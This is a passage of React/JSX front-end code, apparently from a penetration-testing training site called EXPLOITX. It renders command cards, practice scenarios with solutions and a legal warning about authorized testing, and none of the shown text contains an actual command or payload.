                                              <Check className="w-4 h-4" />
                                            ) : (
                                              <Copy className="w-4 h-4" />
                                            )}
                                          </button>
                                        </div>
                                        <code className="block bg-black border border-green-500/50 p-3 text-green-400 font-mono text-sm overflow-x-auto">
                                          {cmd.command}
                                        </code>
                                      </div>

                                      {/* Explanation */}
                                      <p className="text-gray-300 mb-3 leading-relaxed">
                                        <span className="text-cyan-500 font-bold">➜ </span>
                                        {cmd.explanation}
                                      </p>

                                      {/* Example */}
                                      {cmd.example && (
                                        <div className="mb-3">
                                          <span className="text-xs text-gray-500 font-mono block mb-1">EXAMPLE:</span>
                                          <code className="block bg-gray-900 border border-gray-700 p-2 text-gray-400 font-mono text-xs">
                                            {cmd.example}
                                          </code>
                                        </div>
                                      )}

                                      {/* Output */}
                                      {cmd.output && (
                                        <div className="mb-3">
                                          <span className="text-xs text-gray-500 font-mono block mb-1">SAMPLE OUTPUT:</span>
                                          <code className="block bg-gray-900 border border-purple-500/30 p-2 text-purple-300 font-mono text-xs whitespace-pre-wrap">
                                            {cmd.output}
                                          </code>
                                        </div>
                                      )}

                                      {/* Tips */}
                                      {cmd.tips && cmd.tips.length > 0 && (
                                        <div className="bg-blue-500/5 border border-blue-500/20 p-3 mt-3">
                                          <span className="text-blue-400 font-mono text-xs font-bold block mb-2">💡 PRO TIPS:</span>
                                          <ul className="space-y-1">
                                            {cmd.tips.map((tip, tipIdx) => (
                                              <li key={tipIdx} className="text-gray-400 text-xs flex items-start gap-2">
                                                <span className="text-blue-400">•</span>
                                                <span>{tip}</span>
                                              </li>
                                            ))}
                                          </ul>
                                        </div>
                                      )}
                                    </div>
                                  ))}
                                </div>
                              </div>
                            ))}

                            {/* Practice Scenarios */}
                            <div className="border-2 border-purple-500/30 bg-purple-500/5 p-6">
                              <h3 className="text-2xl font-bold text-purple-500 font-mono mb-4">
                                🎮 PRACTICE SCENARIOS
                              </h3>
                              <div className="space-y-6">
                                {tutorial.practiceScenarios.map((scenario, idx) => (
                                  <div key={idx} className="border border-purple-500/30 bg-black/50 p-5">
                                    <div className="mb-4">
                                      <span className="text-purple-400 font-mono text-sm font-bold">SCENARIO #{idx + 1}:</span>
                                      <p className="text-gray-300 mt-2 leading-relaxed">{scenario.scenario}</p>
                                    </div>

                                    <div className="mb-4">
                                      <span className="text-green-400 font-mono text-sm font-bold">✓ SOLUTION:</span>
                                      <code className="block bg-black border border-green-500/50 p-3 text-green-400 font-mono text-sm mt-2 whitespace-pre-wrap">
                                        {scenario.solution}
                                      </code>
                                    </div>

                                    <div className="bg-cyan-500/10 border border-cyan-500/30 p-3">
                                      <span className="text-cyan-400 font-mono text-xs font-bold block mb-2">📖 EXPLANATION:</span>
                                      <p className="text-gray-300 text-sm">{scenario.explanation}</p>
                                    </div>
                                  </div>
                                ))}
                              </div>
                            </div>

                            {/* Warning */}
                            <div className="border-2 border-red-500/30 bg-red-500/5 p-6">
                              <p className="text-red-500 font-mono">
                                <span className="font-bold text-lg">⚠ LEGAL WARNING:</span><br/>
                                <span className="text-sm">
                                  These commands and techniques are extremely powerful. Only use them on systems you own or have explicit written authorization to test. 
                                  Unauthorized access to computer systems is illegal under federal and international law, punishable by severe penalties including imprisonment.
                                  Always obtain proper permissions and stay within the scope of your authorized testing.
                                </span>
                              </p>
                            </div>
                          </div>
                        </motion.div>
                      )}
                    </AnimatePresence>
                  </>
                )}
              </motion.div>
            ))}
          </div>

          {/* Footer */}
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 1 }}
            className="mt-16 text-center"
          >
            <div className="border-t border-green-500/20 pt-8">
              <p className="text-green-500/60 font-mono text-sm mb-2">
                {"> MASTER THE COMMAND LINE - BECOME A TRUE PROFESSIONAL_"}
              </p>
              <p className="text-cyan-500/60 font-mono text-xs">
                PRACTICE IN AUTHORIZED ENVIRONMENTS ONLY
              </p>
              <p className="text-green-500/40 font-mono text-xs mt-4">
                © 2026 EXPLOITX - PROFESSIONAL TRAINING PLATFORM
              </p>
            </div>
          </motion.div>
        </div>
      </div>
    </div>
  );
}
